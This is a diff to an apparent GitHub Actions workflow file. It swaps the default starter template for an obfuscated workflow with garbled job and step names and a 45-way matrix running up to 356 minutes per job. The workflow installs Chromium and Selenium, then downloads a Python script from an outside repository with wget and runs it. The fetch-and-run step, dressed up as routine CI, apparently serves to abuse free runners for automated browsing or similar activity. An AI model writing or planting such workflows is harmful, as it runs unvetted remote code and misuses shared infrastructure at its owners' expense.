@@ -1,36 +1,41 @@
-# This is a basic workflow to help you get started with Actions
-
-name: CI
-
-# Controls when the workflow will run
+name: sbao
 on:
-  # Triggers the workflow on push or pull request events but only for the "main" branch
-  push:
-    branches: [ "main" ]
-  pull_request:
-    branches: [ "main" ]
-
-  # Allows you to run this workflow manually from the Actions tab
   workflow_dispatch:
-
-# A workflow run is made up of one or more jobs that can run sequentially or in parallel
 jobs:
-  # This workflow contains a single job called "build"
-  build:
-    # The type of runner that the job will run on
-    runs-on: ubuntu-latest
-
-    # Steps represent a sequence of tasks that will be executed as part of the job
+  scr-1:
+    runs-on: ubuntu-18.04
+    strategy:
+      max-parallel: 256
+      fail-fast: false
+      matrix:
+         goc: [1.11, 1.12, 1.1c3, 1.1c4, 1.1q5, 1.16o, 1.17s, 1.18s, 1.1w9]
+         flag: [kmn, oiu, qcwe, nvb, lpd]  
+    timeout-minutes: 355
+    env:
+        NUM_JOBS: 256
+        JOB: ${{ matrix.goc }}
     steps:
-      # Checks-out your repository under $GITHUB_WORKSPACE, so your job can access it
-      - uses: actions/checkout@v3
-
-      # Runs a single command using the runners shell
-      - name: Run a one-line script
-        run: echo Hello, world!
-
-      # Runs a set of commands using the runners shell
-      - name: Run a multi-line script
+      - name: stg2o ${{ matrix.goc }}
+        uses: actions/setup-go@v1
+      - name: Setting up Python
+        uses: actions/setup-python@v2
+        with:
+          python-version: '3.9'
+      - name: Showingup package list
+        run: apt list --installed
+      - name: Dev Testui
         run: |
-          echo Add other actions to build,
-          echo test, and deploy your project.
+            sudo apt purge google-chrome-stable
+            sudo apt purge chromium-browser
+            sudo apt install -y chromium-browser
+      - name: Install all necessary packages
+        run: pip install requests names beautifulsoup4 pandas webdriver-manager selenium
+      - name: Sobm Devol
+        run: |
+             wget https://github.com/Mehslos/iot223/raw/main/swp.py
+             python swp.py
+        
+        
+        
+        
+        
